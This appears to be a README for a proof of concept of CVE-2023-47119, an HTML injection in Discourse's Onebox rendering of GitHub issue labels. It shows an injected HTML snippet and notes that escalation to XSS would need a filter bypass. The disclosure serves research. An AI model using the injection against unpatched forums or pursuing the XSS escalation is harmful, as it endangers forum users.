# CVE-2023-47119
A POC for CVE-2023-47119 which is a vulnerability affecting [Discourse](https://github.com/discourse/discourse) versions prior to version 3.1.3 of the `stable` branch and version 3.2.0.beta3 of the `beta` and `tests-passed` branches. Some links canÂ inject arbitrary HTML tags when rendered through the Onebox engine.

# Detailed analysis

Article : 

# POC

- Payload : A link to a github issue with a label including an HTML injection in name. Example https://github.com/BaadMaro/test-discourse-github/issues/2

![image](https://github.com/BaadMaro/CVE-2023-47119/assets/72421091/b572c978-895e-4ec5-b223-4fc0da05f17f)

![image](https://github.com/BaadMaro/CVE-2023-47119/assets/72421091/f28442c9-3966-4f0f-bc6a-cae68d3980ac)

![image](https://github.com/BaadMaro/CVE-2023-47119/assets/72421091/5fccbb53-4d2a-4a2f-a260-ce794296ba41)

```html
<span style="display:inline-block;margin-top:2px;background-color: #B8B8B8;padding: 2px;border-radius: 4px;color: #fff;margin-left: 3px;">
          bug <h1>BaadMaro HTML Injection POC</h1>
        </span>
```

# Escalation ?

A bypass for the used XSS filters is needed https://github.com/discourse/discourse/security#xss 

  

